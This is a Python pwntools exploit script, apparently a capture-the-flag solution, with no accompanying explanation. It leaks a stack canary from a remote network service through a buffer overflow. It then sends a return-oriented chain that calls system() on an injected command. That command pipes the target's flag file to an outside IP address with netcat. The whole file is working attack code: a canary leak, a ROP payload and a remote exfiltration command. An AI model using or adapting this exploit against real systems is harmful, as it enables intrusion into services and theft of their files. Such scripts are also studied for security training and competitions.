from pwn import *

#GADGET
send_plt = p32(0x08048700)
recv_plt = p32(0x080486e0)
writable = p32(0x0804b080) # data
send_got = p32(0x0804b064)
system_plt = p32(0x08048620)
ppppr= p32(0x08048eec)
cmd = '/bin/cat flag | nc 115.68.184.224 23946\x00'

def leak_canary():
	s = remote('110.10.212.130',8888)
	
	s.recvuntil('> ')
	s.sendline('1')
	s.recvuntil(': ')
			
	payload = 'A' * 41
	s.send(payload)		
	
	canary = '\x00' + s.recvline()[41:44]
	
	s.recvuntil('> ')
	s.close()

	return u32(canary)
		
def exploit(canary):
	s = remote('110.10.212.130',8888)

	print len(cmd)
	
	s.recvuntil('> ')
	s.sendline('1')
	s.recvuntil(': ')
	
	payload = 'A' * 40 + p32(canary) + 'A' * 12
	payload += recv_plt + ppppr + p32(4) + writable + p32(len(cmd)) + p32(0)
	payload += system_plt + "DDDD" + writable + "\x00\x00\x00\x00"

	s.send(payload)
	print len(payload)

	s.recvuntil('> ')
	s.sendline('3')

	sleep(0.03)
	s.send(cmd)

	sleep(10)
	s.close()
def main():
	canary = leak_canary()
	
	print 'LEAK_CANARY : %x' % canary
	
	exploit(canary)


if __name__ == '__main__':
	main()
